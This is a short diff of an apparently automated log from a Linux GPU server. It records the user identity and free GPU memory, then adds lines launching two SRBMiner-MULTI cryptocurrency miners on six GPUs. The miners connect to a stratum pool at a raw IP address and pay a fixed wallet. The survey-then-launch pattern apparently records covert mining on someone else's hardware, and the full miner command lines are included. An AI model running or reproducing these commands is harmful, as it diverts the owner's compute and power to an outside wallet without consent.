@@ -14,3 +14,10 @@ V37BOOT||uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),
 --E--
 V37FREE||0,1,4,5,6,7 || 0, 13756 MiB | 1, 12164 MiB | 2, 72771 MiB | 3, 78013 MiB | 4, 15529 MiB | 5, 16105 MiB | 6, 19449 MiB | 7, 16105 MiB |  | --E-- | 
 --E--
+V37LAUNCH||gpus=0;1;4;5;6;7
+2570620 ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://220.158.235.192:12001 --wallet prl1phzm3ve2e5evduckml80c7u9pdhdr4jw2uq4qv2m8c3ty4pjx9dtswvx62m2
+2586588 ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://220.158.235.192:12001 --wallet prl1phzm3ve2e5evduckml80c7u9pdhdr4jw2uq4qv2m8c3ty4pjx9dtswvx62m2
+
+--E--
+
+--E--
